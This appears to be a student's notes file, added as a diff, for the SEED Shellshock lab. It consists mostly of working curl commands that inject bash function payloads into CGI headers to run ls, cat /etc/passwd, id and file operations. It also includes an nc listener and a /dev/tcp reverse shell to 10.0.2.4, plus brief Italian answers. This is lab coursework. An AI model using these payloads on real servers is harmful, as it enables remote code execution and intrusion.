@@ -1,0 +1,68 @@
+## Shellshock Attack Lab
+
+## curl
+curl http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
+curl http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
+
+
+## TASK 3
+curl http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi -A "() { echo hello; } ; echo Content_type: text/plain; echo; /bin/ls -l"
+
+
+
+## TASK 3.A
+curl http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi -A "() { echo hello; } ; echo Content_type: text/plain; echo; /bin/cat /etc/passwd"
+
+
+## TASK 3.B
+curl http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi -e "() { echo hello; } ; echo Content_type: text/plain; echo; /bin/id"
+
+
+## TASK 3.C 
+  ## - List the /tmp folder
+curl http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi -H "My-Header: () { echo hello; } ; echo Content_type: text/plain; echo; /bin/ls -l /tmp"
+
+  ## - Create a file inside the /tmp folder
+curl http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi -H "My-Header: () { echo hello; } ; echo Content_type: text/plain; echo; /bin/touch /tmp/pippo"
+
+## TASK 3.D
+  ## - Delete the file just created
+curl http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi -H "My-Header: () { echo hello; } ; echo Content_type: text/plain; echo; /bin/rm /tmp/pippo"
+
+
+
+
+## Question 1 
+Il file etc/shadow è accessibile solo con i privilegi di root.
+
+curl http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi -e "() { echo hello; } ; echo Content_type: text/plain; echo; /bin/id"
+uid=33(www-data) gid=33(www-data) groups=33(www-data).
+
+#Su Ubuntu, i web server eseguono con l'user uid=33(www-data), questo rende i loro privilegi limitati. 
+
+#Per questo non è possibile rubare il contenuto del file /etc/shadow.
+
+
+## Question 2
+#No, non è possibile passare il payload malevolo come parametro della URL
+
+curl "http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?AAAAA"
+
+curl "http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?() { echo hello; } ; echo Content_type: text/plain; echo; /bin/ls -latr"
+
+## URL encoding
+curl "http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?%28%29+%7B+echo+hello%3B+%7D+%3B+echo+Content_type%3A+text%2Fplain%3B+echo%3B+%2Fbin%2Fls+-latr"
+
+
+##TASK 4
+  ## On attacker machine (10.0.2.4)
+nc -lvn 9090
+
+  ## - Creating a reverse shell
+curl http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi -e "() { echo hello; } ; echo Content_type: text/plain; echo; /bin/bash > /dev/tcp/10.0.2.4/9090 0<&1 2>&1"
+
+
+## TASK 5
+#La shell patchata non è più vulnerabile e non esegue i comandi ==> l'attacco shellshock non è più possibile
+
+
